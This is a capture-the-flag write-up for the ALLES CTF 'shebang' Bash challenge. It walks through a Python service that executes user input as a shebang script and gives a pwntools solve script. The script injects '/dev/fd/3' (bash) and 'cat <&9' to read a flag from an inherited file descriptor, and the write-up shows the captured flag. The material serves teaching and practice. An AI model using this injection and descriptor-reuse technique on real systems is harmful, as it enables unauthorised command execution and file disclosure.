## Description

```  
Category: Bash  
Difficulty: Easy  
Author: nopinjector

Shebang provides us with nice kernel-supported execution functionality since
1980.

Challenge Files: shebang.py Dockerfile ynetd  
```

## Analysis

We have 3 files, but `shebang.py` is the important one:

```python  
#!/usr/bin/python3 -u  
import os  
import secrets

NOBODY = 65534  
NOGROUP = 65534

def check_input(data):  
   if b'.' in data:  
       os._exit(1)

def main():  
   os.open('/bin/bash', os.O_RDONLY)  
   fd = os.open('./flag', os.O_RDONLY)  
   os.dup2(fd, 9)

   path = os.path.join('/tmp', secrets.token_hex(16))

   print("#!/d", end="")  
   data = os.read(0, 0x10)  
   os.close(0)  
   check_input(data)

   fd = os.open(path, os.O_CREAT | os.O_RDWR, 0o777)  
   os.write(fd, b'#!/d' + data)  
   os.close(fd)

   pid = os.fork()  
   if pid == 0:  
       os.setresgid(NOGROUP, NOGROUP, NOGROUP)  
       os.setresuid(NOBODY, NOBODY, NOBODY)  
       try:  
           os.execv(path, [path])  
       except:  
           os._exit(-1)  
   else:  
       os.waitpid(pid, 0)  
       os.unlink(path)

if __name__ == '__main__':  
   main()  
```

Let's break it down. We can't use `.` in our input:

```python  
def check_input(data):  
   if b'.' in data:  
       os._exit(1)  
```

`main` opens 2 files right away. `/bin/bash` at fd `3`, and `./flag` which it
dups to fd `9`.

```python  
   os.open('/bin/bash', os.O_RDONLY)  
   fd = os.open('./flag', os.O_RDONLY)  
   os.dup2(fd, 9)  
```

Then it prompts for 16 bytes of input, prepends it with `#!/d`, and writes the
contents to a file under `/tmp`:

```python  
   path = os.path.join('/tmp', secrets.token_hex(16))

   print("#!/d", end="")  
   data = os.read(0, 0x10)  
   os.close(0)  
   check_input(data)

   fd = os.open(path, os.O_CREAT | os.O_RDWR, 0o777)  
   os.write(fd, b'#!/d' + data)  
   os.close(fd)  
```

After that, it forks and the child calls `execv` on our new temp file.

```python  
   pid = os.fork()  
   if pid == 0:  
       os.setresgid(NOGROUP, NOGROUP, NOGROUP)  
       os.setresuid(NOBODY, NOBODY, NOBODY)  
       try:  
           os.execv(path, [path])  
       except:  
           os._exit(-1)  
```

Since the string always starts with `#!/d`, we need to use what we can under
`/dev`.

```  
kali@kali:~/Downloads$ ls /dev  
autofs           full          port    snapshot  tty17  tty31  tty46  tty60
vcs    vcsu  
block            fuse          ppp     snd       tty18  tty32  tty47  tty61
vcs1   vcsu1  
bsg              hidraw0       psaux   sr0       tty19  tty33  tty48  tty62
vcs2   vcsu2  
btrfs-control    hpet          ptmx    stderr    tty2   tty34  tty49  tty63
vcs3   vcsu3  
bus              hugepages     pts     stdin     tty20  tty35  tty5   tty7
vcs4   vcsu4  
cdrom            initctl       random  stdout    tty21  tty36  tty50  tty8
vcs5   vcsu5  
char             input         rfkill  tty       tty22  tty37  tty51  tty9
vcs6   vcsu6  
console          kmsg          rtc     tty0      tty23  tty38  tty52  ttyS0
vcs7   vcsu7  
core             log           rtc0    tty1      tty24  tty39  tty53  ttyS1
vcsa   vfio  
cpu_dma_latency  loop-control  sda     tty10     tty25  tty4   tty54  ttyS2
vcsa1  vga_arbiter  
cuse             mapper        sda1    tty11     tty26  tty40  tty55  ttyS3
vcsa2  vhci  
disk             mem           sda2    tty12     tty27  tty41  tty56  uhid
vcsa3  vhost-net  
dri              mqueue        sda5    tty13     tty28  tty42  tty57  uinput
vcsa4  vhost-vsock  
dvd              net           sg0     tty14     tty29  tty43  tty58  urandom
vcsa5  zero  
fb0              null          sg1     tty15     tty3   tty44  tty59
vboxguest  vcsa6  
fd               nvram         shm     tty16     tty30  tty45  tty6   vboxuser
vcsa7  
kali@kali:~/Downloads$ ls /dev/fd  
0  1  2  3  
```

We should be able to do something with fd 3 (`/bin/bash`) and fd 9 (`./flag`).

## Solution

After a bit of trial-and-error, this is what I ended up with:

```python  
#!/usr/bin/python3  
from pwn import *

#context.log_level='DEBUG'  
#p = process(['./shebang.py'])  
#p = process(['ncat', 'localhost', '1024'])  
p = process(['ncat', '--ssl',
'7b00000060bf195c66261d67.challenges.broker5.allesctf.net', '1337'])  
p.recvuntil('#!/d')  
p.sendline('ev/fd/3\ncat <&9')  
flag = p.recvline().rstrip()  
print(flag)  
```

That will use the open file descriptors to create and execute the equivalent
of this bash script:

```bash  
#!/bin/bash  
cat ./flag  
```

Run it against the remote service and we get our flag:

```  
kali@kali:~/Downloads$ ./shebang_solve.py  
[+] Starting local process '/usr/bin/ncat': pid 23080  
b'ALLES{reusing_filedescriptors_saves_resources}'  
```  

Original writeup
(https://github.com/dobsonj/ctf/tree/master/writeups/2020/allesctf/shebang#shebang).